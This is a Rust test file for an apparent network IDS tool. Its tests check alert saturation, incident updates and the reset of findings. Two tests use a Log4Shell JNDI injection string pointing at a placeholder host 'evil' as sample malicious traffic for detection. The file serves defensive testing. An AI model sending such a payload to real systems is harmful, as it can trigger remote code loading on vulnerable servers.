#[path = "support/packets.rs"]
mod packets;

#[cfg(feature = "terminal-ui")]
use packrat_tui::app::App;
use packrat_tui::net::security::SecurityEngine;

#[test]
#[cfg(feature = "terminal-ui")]
fn saturated_ids_history_does_not_suppress_new_critical_incidents() {
    let mut app = App::new_for_test();
    let payload = b"GET /${jndi:ldap://evil/x} HTTP/1.1\r\nHost: example\r\n\r\n";
    for no in 1..=1000 {
        app.core.security.update(&packets::tcp(no, 1, 0x18, payload));
    }
    assert_eq!(app.core.security.ids_alerts.len(), 1000);
    for no in 1001..=1002 {
        app.inject_packet(packets::tcp(no, 1, 0x18, payload));
    }
    assert_eq!(app.core.security.ids_alerts.len(), 1000);
    assert!(app.alert_overlay_open);
    let alert = app.core.alert_center
        .items
        .iter()
        .find(|item| item.source == "IDS" && item.title.contains("Log4Shell"))
        .unwrap();
    assert_eq!(alert.hit_count, 2);
    assert_eq!(alert.last_packet, 1002);
    assert_eq!(app.core.incidents.active().unwrap().last_packet, 1002);
}

#[test]
fn batches_are_packet_local_and_reset_without_replaying_old_findings() {
    let mut engine = SecurityEngine::new();
    assert!(
        !engine
            .inspect(&packets::tcp(1, 1, 0x18, b"${jndi:ldap://evil/x}"))
            .ids
            .is_empty()
    );
    assert!(
        engine
            .inspect(&packets::tcp(2, 25, 0x18, b"benign"))
            .ids
            .is_empty()
    );
    engine.clear();
    assert!(
        engine
            .inspect(&packets::tcp(3, 1, 0x18, b"benign"))
            .ids
            .is_empty()
    );
}

#[test]
fn saturated_exposure_history_still_emits_the_current_packet() {
    let mut engine = SecurityEngine::new();
    let payload = b"GET /admin HTTP/1.1\r\nHost: example\r\n\r\n";
    for no in 1..=1000 {
        engine.update(&packets::tcp(no, 1, 0x18, payload));
    }
    assert_eq!(engine.vuln_hits.len(), 1000);
    let findings = engine.inspect(&packets::tcp(1001, 1, 0x18, payload));
    assert_eq!(findings.vulnerabilities.len(), 1);
    assert_eq!(findings.vulnerabilities[0].pkt_no, 1001);
    assert_eq!(engine.vuln_hits.len(), 1000);
}
